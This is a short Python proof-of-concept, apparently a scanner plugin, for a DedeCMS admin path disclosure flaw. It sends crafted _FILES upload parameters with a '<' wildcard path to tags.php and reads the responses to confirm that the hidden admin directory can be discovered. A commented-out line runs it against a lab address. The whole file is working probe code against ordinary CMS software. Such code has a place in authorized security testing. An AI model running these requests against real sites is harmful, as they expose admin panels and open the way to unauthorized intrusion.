# coding: utf-8
import requests
from os import path

#DedeCms后台地址泄露漏洞
def poc(url,user_agent,proxy):

    url = url.strip("/")
    exp_url = url  + '/tags.php'

    header = {'User-Agent': user_agent}

    data1 = {
        'dopost': 'save',
        '_FILES[b4dboy][tmp_name]': './de</images/admin_top_logo.gif',
        '_FILES[b4dboy][name]': 0,
        '_FILES[b4dboy][size]': 0,
        '_FILES[b4dboy][type]': 'image/gif'
    }
    data2 = {
        'dopost': 'save',
        '_FILES[b4dboy][tmp_name]': './de</image/admin_top_logo.gif',
        '_FILES[b4dboy][name]': 0,
        '_FILES[b4dboy][size]': 0,
        '_FILES[b4dboy][type]': 'image/gif'
    }

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response1 = requests.post(exp_url, headers=header,data=data1, proxies=proxies)
        response2 = requests.post(exp_url, headers=header,data=data2, proxies=proxies)
    else:
        response1 = requests.post(exp_url, headers=header,data=data1)
        response2 = requests.post(exp_url, headers=header,data=data2)

    # print(response1.text)
    # print(response2.text)
    if 'Upload filetype not allow' in response2.text and 'DedeCMS' in response1.text:
        return 'DedeCms - 后台地址泄露漏洞'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

# run("http://192.168.220.128/DedeCMS/DedeCMS-V5.7-UTF8-SP2/uploads/",{'admin':'admin'},'','')
